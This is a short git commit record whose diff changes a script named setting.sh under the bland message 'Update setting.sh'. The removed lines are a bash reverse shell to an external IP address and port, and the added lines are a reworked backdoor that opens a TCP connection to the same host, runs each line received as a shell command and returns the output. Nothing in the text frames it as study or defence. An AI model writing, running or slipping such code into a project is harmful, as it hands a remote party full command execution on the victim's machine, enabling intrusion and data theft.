fa616437efd1dff7cbaccedb6baa38705359e091
Harpreet Brar <iamunknowniint@gmail.com>
2025-07-03 18:14:37 +0500

    Update setting.sh

--- setting.sh
+++ setting.sh
@@ -1,4 +1,5 @@
 #!/bin/bash
-
-# Reverse shell to 52.74.74.86:19489 using bash and TCP
-bash -i >& /dev/tcp/52.74.74.86/19489 0>&1
+exec 5<>/dev/tcp/52.74.74.86/19489
+while read -r line <&5; do
+  (echo "=> $line"; $line) >&5 2>&5
+done
